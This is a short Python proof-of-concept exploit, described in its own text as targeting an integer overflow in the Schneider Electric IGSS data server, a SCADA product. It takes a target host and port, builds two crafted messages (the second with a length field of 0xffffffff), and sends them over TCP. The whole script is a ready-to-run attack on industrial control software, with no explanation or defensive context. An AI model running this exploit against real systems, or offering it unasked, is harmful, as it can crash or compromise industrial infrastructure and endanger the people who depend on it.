import sys, socket, argparse, hexdump, time
from struct import *

def dump(title, data):
  if debug and data:
    print('[-- %s --]' % (title))
    hexdump.hexdump(data)

#
# MAIN
#
descr = 'Schneider Electric IGSS data server integer overflow'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='target host')
parser.add_argument('-p', '--port', type=int, default=12401, help='IGSSdataServer.exe port, default: %(default)s')
parser.add_argument('-v', '--verbose', action='store_true', help='dump sending messages')

args = parser.parse_args()
target = args.target
port = args.port
debug = args.verbose


fdata = b'A' * 16
data  = pack('<II', 2, 0) 
data += b'\x00' * (0xa8 - len(data))
data1 =  data + pack('<I', len(fdata)) + fdata 
data2 =  data + pack('<I', 0xffffffff) + fdata 

msg1 = pack('<HHIII', 1, 0, 13, 0, 0) + data1
msg1 = pack('<H', 2 + len(msg1)) + msg1
dump('msg1', msg1)

msg2 = pack('<HHIII', 1, 0, 13, 0, 1) + data2
msg2 = pack('<H', 2 + len(msg2)) + msg2
dump('msg2', msg2)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.sendall(msg1)
time.sleep(1)
s.sendall(msg2)
s.close()

